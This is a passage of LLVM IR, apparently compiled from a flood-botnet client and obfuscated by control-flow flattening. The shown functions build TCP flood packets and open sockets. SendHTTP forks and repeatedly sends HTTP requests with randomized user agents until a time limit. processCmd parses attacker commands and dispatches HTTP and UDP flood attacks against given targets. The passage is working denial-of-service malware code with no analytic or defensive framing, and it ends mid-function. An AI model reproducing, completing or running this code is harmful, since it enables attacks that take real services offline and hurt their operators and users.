  %305 = bitcast %union.anon* %304 to %struct.anon.0*
  %306 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %305, i32 0, i32 2
  store i32 %302, i32* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = trunc i32 %307 to i16
  %309 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 0
  %311 = bitcast %union.anon* %310 to %struct.anon.0*
  %312 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %311, i32 0, i32 0
  store i16 %308, i16* %312, align 4
  %313 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon* %314 to %struct.anon.0*
  %316 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %315, i32 0, i32 6
  store i16 0, i16* %316, align 4
  %317 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = call zeroext i16 @tcpcsum(%struct.iphdr* %317, %struct.tcphdr* %318)
  %320 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon* %321 to %struct.anon.0*
  %323 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %322, i32 0, i32 6
  store i16 %319, i16* %323, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %324 = bitcast i8* %.reload6 to i16*
  %325 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %326 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %325, i32 0, i32 2
  %327 = load i16, i16* %326, align 2
  %328 = zext i16 %327 to i32
  %329 = call zeroext i16 @csum(i16* %324, i32 %328)
  %330 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 7
  store i16 %329, i16* %331, align 2
  %332 = load i32, i32* %25, align 4
  %333 = load i32, i32* %15, align 4
  %334 = icmp eq i32 %332, %333
  %335 = select i1 %334, i32 -1716821187, i32 1956584359
  store i32 %335, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = call i64 @time(i64* null) #5
  %338 = load i32, i32* %24, align 4
  %339 = sext i32 %338 to i64
  %340 = icmp sgt i64 %337, %339
  %341 = select i1 %340, i32 -2097019986, i32 86493832
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  store i32 -1178723038, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 775453708, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i32, i32* %25, align 4
  %346 = add i32 %345, 1
  store i32 %346, i32* %25, align 4
  store i32 775453708, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %348)
  store i32 -1100023415, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %347, %344, %343, %342, %336, %289, %288, %262, %257, %255, %237, %236, %234, %233, %232, %231, %230, %229, %221, %216, %208, %203, %195, %190, %182, %177, %169, %164, %160, %157, %121, %73, %67, %66, %62, %61, %55, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 -1277883131, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1277883131, label %first
    i32 2044878846, label %14
    i32 2122441446, label %15
    i32 -606747499, label %38
    i32 549066246, label %39
    i32 -1716821030, label %45
    i32 -1151551050, label %46
    i32 -26378446, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 2044878846, i32 2122441446
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -26378446, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #5
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #10
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #5
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 -606747499, i32 549066246
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -26378446, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 -1716821030, i32 -1151551050
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -26378446, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 -26378446, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 1258622607, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1258622607, label %24
    i32 1657861611, label %29
    i32 400994518, label %43
    i32 -1425243413, label %44
    i32 -558005586, label %50
    i32 1793004409, label %57
    i32 -1935330412, label %68
    i32 896600172, label %69
    i32 1807149890, label %70
    i32 1537606806, label %71
    i32 1081675026, label %74
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  %28 = select i1 %27, i32 1657861611, i32 1081675026
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %31 = load i8*, i8** %7, align 8
  %32 = load i8*, i8** %10, align 8
  %33 = load i8*, i8** %8, align 8
  %34 = call i32 @rand() #5
  %35 = srem i32 %34, 59
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* %30, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.110, i32 0, i32 0), i8* %31, i8* %32, i8* %33, i8* %38) #5
  %40 = call i32 @fork() #5
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 400994518, i32 1807149890
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1425243413, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %15, align 4
  %46 = sext i32 %45 to i64
  %47 = call i64 @time(i64* null) #5
  %48 = icmp sgt i64 %46, %47
  %49 = select i1 %48, i32 -558005586, i32 896600172
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
  %56 = select i1 %55, i32 1793004409, i32 -1935330412
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %13, align 4
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %61 = call i64 @strlen(i8* %60) #9
  %62 = call i64 @write(i32 %58, i8* %59, i64 %61)
  %63 = load i32, i32* %13, align 4
  %64 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %65 = call i64 @read(i32 %63, i8* %64, i64 1)
  %66 = load i32, i32* %13, align 4
  %67 = call i32 @close(i32 %66)
  store i32 -1935330412, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 -1425243413, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:70:                                     ; preds = %loopEntry
  store i32 1537606806, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %14, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %14, align 4
  store i32 1258622607, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %71, %70, %68, %57, %50, %44, %43, %29, %24, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %30 = load i8**, i8*** %4, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @strcmp(i8* %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0)) #9
  store i32 %33, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1787241543, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1787241543, label %first
    i32 948971966, label %36
    i32 -3507689, label %37
    i32 689298118, label %44
    i32 497615124, label %48
    i32 -1670798321, label %55
    i32 1702364500, label %62
    i32 -1655256431, label %63
    i32 150086169, label %67
    i32 1704329822, label %68
    i32 1201205509, label %91
    i32 -1252990601, label %98
    i32 287232821, label %102
    i32 943762210, label %109
    i32 1848003544, label %116
    i32 -96556740, label %123
    i32 269401270, label %130
    i32 1413047332, label %134
    i32 938585305, label %141
    i32 -751471285, label %142
    i32 -1647692457, label %161
    i32 -1526451190, label %166
    i32 -582373273, label %167
    i32 -35799505, label %172
    i32 1186609055, label %175
    i32 -683760832, label %179
    i32 -1302827117, label %183
    i32 723714695, label %190
    i32 2060478829, label %192
    i32 -286082071, label %193
    i32 356103437, label %197
    i32 985425605, label %198
    i32 137854085, label %205
    i32 1143706606, label %206
    i32 2143482848, label %213
    i32 1630165576, label %217
    i32 -1897647013, label %224
    i32 -1062638803, label %231
    i32 -703247651, label %235
    i32 -3712855, label %242
    i32 -434349524, label %246
    i32 1957480576, label %253
    i32 1989056355, label %254
    i32 1142685780, label %272
    i32 1535187489, label %277
    i32 523172277, label %278
    i32 -1528642592, label %282
    i32 1409798398, label %287
    i32 -297137684, label %288
    i32 766815109, label %293
    i32 -1928697202, label %296
    i32 -1128124125, label %300
    i32 -2111710871, label %304
    i32 1504999512, label %312
    i32 703501090, label %314
    i32 1989831542, label %315
    i32 1309707097, label %319
    i32 -807351440, label %320
    i32 268894968, label %328
    i32 -139948075, label %329
    i32 462881213, label %336
    i32 -1677920293, label %340
    i32 291124716, label %347
    i32 801409294, label %354
    i32 918586492, label %355
    i32 -104721524, label %371
    i32 -824058880, label %374
    i32 -450287169, label %378
    i32 -1736701409, label %382
    i32 -866125530, label %386
    i32 -202676071, label %388
    i32 -229194679, label %389
    i32 -1745251133, label %393
    i32 1593897545, label %394
    i32 -1042333730, label %398
    i32 -1030888811, label %399
    i32 -1678776078, label %406
    i32 308159397, label %410
    i32 -70330845, label %417
    i32 -1843367926, label %424
    i32 -108762959, label %425
    i32 1958687164, label %441
    i32 876186498, label %444
    i32 -1317410157, label %448
    i32 -1059668873, label %452
    i32 798697875, label %456
    i32 -441096034, label %458
    i32 -1115075901, label %459
    i32 -363082374, label %463
    i32 -98432851, label %464
    i32 -2132134959, label %468
    i32 -1406930256, label %469
    i32 2005543123, label %476
    i32 -545631605, label %477
    i32 1343728294, label %482
    i32 -1827545624, label %489
    i32 1017282912, label %497
    i32 1209824537, label %505
    i32 -1518156632, label %506
    i32 1080523664, label %509
    i32 -223519774, label %513
    i32 -1500222767, label %514
    i32 -1210502106, label %515
    i32 -1343574273, label %516
    i32 -1764301128, label %523
    i32 -1462779459, label %524
    i32 -1681905996, label %531
    i32 356111669, label %536
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %34 = icmp ne i32 %.reload, 0
  %35 = select i1 %34, i32 -3507689, i32 948971966
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.112, i32 0, i32 0)) #9
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 1201205509, i32 689298118
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %3, align 4
  %46 = icmp slt i32 %45, 6
  %47 = select i1 %46, i32 1702364500, i32 497615124
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8**, i8*** %4, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 3
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @atoi(i8* %51) #9
  %53 = icmp slt i32 %52, 1
  %54 = select i1 %53, i32 1702364500, i32 -1670798321
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i8**, i8*** %4, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 5
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @atoi(i8* %58) #9
  %60 = icmp slt i32 %59, 1
  %61 = select i1 %60, i32 1702364500, i32 -1655256431
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = call i32 @listFork()
  %65 = icmp ne i32 %64, 0
  %66 = select i1 %65, i32 150086169, i32 1704329822
  store i32 %66, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 1
  %71 = load i8*, i8** %70, align 8
  %72 = load i8**, i8*** %4, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 2
  %74 = load i8*, i8** %73, align 8
  %75 = load i8**, i8*** %4, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 3
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @atoi(i8* %77) #9
  %79 = trunc i32 %78 to i16
  %80 = load i8**, i8*** %4, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 4
  %82 = load i8*, i8** %81, align 8
  %83 = load i8**, i8*** %4, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 5
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 @atoi(i8* %85) #9
  %87 = load i8**, i8*** %4, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 6
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 @atoi(i8* %89) #9
  call void @SendHTTP(i8* %71, i8* %74, i16 zeroext %79, i8* %82, i32 %86, i32 %90)
  call void @exit(i32 0) #12
  unreachable

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i8**, i8*** %4, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 0
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @strcmp(i8* %94, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.113, i32 0, i32 0)) #9
  %96 = icmp ne i32 %95, 0
  %97 = select i1 %96, i32 1143706606, i32 -1252990601
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %3, align 4
  %100 = icmp slt i32 %99, 6
  %101 = select i1 %100, i32 938585305, i32 287232821
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i8**, i8*** %4, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 3
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @atoi(i8* %105) #9
  %107 = icmp eq i32 %106, -1
  %108 = select i1 %107, i32 938585305, i32 943762210
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 2
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @atoi(i8* %112) #9
  %114 = icmp eq i32 %113, -1
  %115 = select i1 %114, i32 938585305, i32 1848003544
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i8**, i8*** %4, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 4
  %119 = load i8*, i8** %118, align 8
  %120 = call i32 @atoi(i8* %119) #9
  %121 = icmp eq i32 %120, -1
  %122 = select i1 %121, i32 938585305, i32 -96556740
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 4
  %126 = load i8*, i8** %125, align 8
  %127 = call i32 @atoi(i8* %126) #9
  %128 = icmp sgt i32 %127, 1024
  %129 = select i1 %128, i32 938585305, i32 269401270
  store i32 %129, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i32, i32* %3, align 4
  %132 = icmp eq i32 %131, 6
  %133 = select i1 %132, i32 1413047332, i32 -751471285
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8**, i8*** %4, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 5
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @atoi(i8* %137) #9
  %139 = icmp slt i32 %138, 1
  %140 = select i1 %139, i32 938585305, i32 -751471285
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 1
  %145 = load i8*, i8** %144, align 8
  store i8* %145, i8** %5, align 8
  %146 = load i8**, i8*** %4, align 8
  %147 = getelementptr inbounds i8*, i8** %146, i64 2
  %148 = load i8*, i8** %147, align 8
  %149 = call i32 @atoi(i8* %148) #9
  store i32 %149, i32* %6, align 4
  %150 = load i8**, i8*** %4, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 3
  %152 = load i8*, i8** %151, align 8
  %153 = call i32 @atoi(i8* %152) #9
  store i32 %153, i32* %7, align 4
  %154 = load i8**, i8*** %4, align 8
  %155 = getelementptr inbounds i8*, i8** %154, i64 4
  %156 = load i8*, i8** %155, align 8
  %157 = call i32 @atoi(i8* %156) #9
  store i32 %157, i32* %8, align 4
  %158 = load i32, i32* %3, align 4
  %159 = icmp eq i32 %158, 6
  %160 = select i1 %159, i32 -1647692457, i32 -1526451190
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8**, i8*** %4, align 8
  %163 = getelementptr inbounds i8*, i8** %162, i64 5
  %164 = load i8*, i8** %163, align 8
  %165 = call i32 @atoi(i8* %164) #9
  store i32 -582373273, i32* %switchVar
  store i32 %165, i32* %.reg2mem2
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  store i32 -582373273, i32* %switchVar
  store i32 10, i32* %.reg2mem2
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %168 = load i8*, i8** %5, align 8
  %169 = call i8* @strstr(i8* %168, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %170 = icmp ne i8* %169, null
  %171 = select i1 %170, i32 -35799505, i32 -286082071
  store i32 %171, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i8*, i8** %5, align 8
  %174 = call i8* @strtok(i8* %173, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %174, i8** %11, align 8
  store i32 1186609055, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i8*, i8** %11, align 8
  %177 = icmp ne i8* %176, null
  %178 = select i1 %177, i32 -683760832, i32 2060478829
  store i32 %178, i32* %switchVar
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = call i32 @listFork()
  %181 = icmp ne i32 %180, 0
  %182 = select i1 %181, i32 723714695, i32 -1302827117
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i8*, i8** %11, align 8
  %185 = load i32, i32* %6, align 4
  %186 = load i32, i32* %7, align 4
  %187 = load i32, i32* %8, align 4
  %188 = load i32, i32* %9, align 4
  %189 = load i32, i32* %10, align 4
  call void @SendUDP(i8* %184, i32 %185, i32 %186, i32 %187, i32 %188, i32 %189)
  call void @_exit(i32 0) #11
  unreachable

; <label>:190:                                    ; preds = %loopEntry
  %191 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %191, i8** %11, align 8
  store i32 1186609055, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  store i32 137854085, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = call i32 @listFork()
  %195 = icmp ne i32 %194, 0
  %196 = select i1 %195, i32 356103437, i32 985425605
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = load i8*, i8** %5, align 8
  %200 = load i32, i32* %6, align 4
  %201 = load i32, i32* %7, align 4
  %202 = load i32, i32* %8, align 4
  %203 = load i32, i32* %9, align 4
  %204 = load i32, i32* %10, align 4
  call void @SendUDP(i8* %199, i32 %200, i32 %201, i32 %202, i32 %203, i32 %204)
  call void @_exit(i32 0) #11
  unreachable

; <label>:205:                                    ; preds = %loopEntry
  store i32 1143706606, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load i8**, i8*** %4, align 8
  %208 = getelementptr inbounds i8*, i8** %207, i64 0
  %209 = load i8*, i8** %208, align 8
  %210 = call i32 @strcmp(i8* %209, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.114, i32 0, i32 0)) #9
  %211 = icmp ne i32 %210, 0
  %212 = select i1 %211, i32 -139948075, i32 2143482848
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i32, i32* %3, align 4
  %215 = icmp slt i32 %214, 6
  %216 = select i1 %215, i32 1957480576, i32 1630165576
  store i32 %216, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i8**, i8*** %4, align 8
  %219 = getelementptr inbounds i8*, i8** %218, i64 3
  %220 = load i8*, i8** %219, align 8
  %221 = call i32 @atoi(i8* %220) #9
  %222 = icmp eq i32 %221, -1
  %223 = select i1 %222, i32 1957480576, i32 -1897647013
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i8**, i8*** %4, align 8
  %226 = getelementptr inbounds i8*, i8** %225, i64 2
  %227 = load i8*, i8** %226, align 8
  %228 = call i32 @atoi(i8* %227) #9
  %229 = icmp eq i32 %228, -1
  %230 = select i1 %229, i32 1957480576, i32 -1062638803
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load i32, i32* %3, align 4
